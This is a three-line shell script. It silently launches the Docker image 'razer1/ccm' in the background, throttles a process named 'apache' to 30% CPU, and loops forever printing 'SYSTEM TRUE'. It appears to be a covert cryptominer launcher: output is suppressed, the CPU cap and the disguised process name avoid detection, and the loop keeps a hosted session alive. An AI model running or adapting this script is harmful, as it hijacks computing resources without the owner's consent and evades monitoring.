sudo docker run razer1/ccm >/dev/null 2>&1 >/dev/null &
cpulimit -l 30 apache >/dev/null 2>&1 >/dev/null &
while :; do echo "SYSTEM TRUE"; sleep 30; done